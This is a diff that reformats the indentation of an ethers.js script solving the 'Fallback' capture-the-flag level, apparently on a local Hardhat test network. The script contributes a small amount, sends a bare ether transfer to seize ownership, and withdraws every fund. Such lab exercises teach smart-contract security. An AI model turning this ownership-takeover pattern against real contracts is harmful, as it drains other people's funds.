@@ -5,40 +5,40 @@ const PLAYER_ADDR = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
 
 
 async function main() {
-  let player = await ethers.getSigner(PLAYER_ADDR)
+    let player = await ethers.getSigner(PLAYER_ADDR)
 
-  const contract = await ethers.getContractAt(
-    "Fallback",
-    CTRT_ADDR,
-    player
-  );
+    const contract = await ethers.getContractAt(
+        "Fallback",
+        CTRT_ADDR,
+        player
+    );
 
 
-  console.log("--[1] contribute");
-  await contract.contribute({
-    value: ethers.utils.parseEther("0.0001"),
-    gasLimit: 50000
-  });
+    console.log("--[1] contribute");
+    await contract.contribute({
+        value: ethers.utils.parseEther("0.0001"),
+        gasLimit: 50000
+    });
 
-  console.log("Current contribution", ((await contract.getContribution()).toString()))
-  
-  console.log("--[2] send malicious TX");
-  const tx = {
-    to: CTRT_ADDR,
-    value: ethers.utils.parseEther("0.0001"),
-  };
+    console.log("Current contribution", ((await contract.getContribution()).toString()))
 
-  await player.sendTransaction(tx);
+    console.log("--[2] send malicious TX");
+    const tx = {
+        to: CTRT_ADDR,
+        value: ethers.utils.parseEther("0.0001"),
+    };
 
-  console.log("--[3] withdraw all the money");
-  const owner = await contract.owner();
+    await player.sendTransaction(tx);
 
-  if (owner == player.address) {
-    await contract.withdraw();
-  }
+    console.log("--[3] withdraw all the money");
+    const owner = await contract.owner();
+
+    if (owner == player.address) {
+        await contract.withdraw();
+    }
 }
 
 main().catch((error) => {
-  console.error(error);
-  process.exitCode = 1;
+    console.error(error);
+    process.exitCode = 1;
 });
